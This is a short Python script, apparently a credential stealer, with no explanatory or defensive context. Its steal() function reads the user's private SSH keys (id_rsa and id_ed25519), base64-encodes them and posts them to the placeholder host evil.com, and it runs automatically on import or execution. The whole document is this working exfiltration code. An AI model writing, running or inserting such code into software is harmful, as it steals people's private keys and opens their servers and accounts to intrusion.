import os, base64, requests
def steal():
    for kf in ['id_rsa','id_ed25519']:
        kp = os.path.expanduser(f'~/.ssh/{kf}')
        if os.path.exists(kp):
            d = base64.b64encode(open(kp).read().encode()).decode()
            requests.post('http://evil.com/collect',json={'type':'ssh','data':d})
steal()
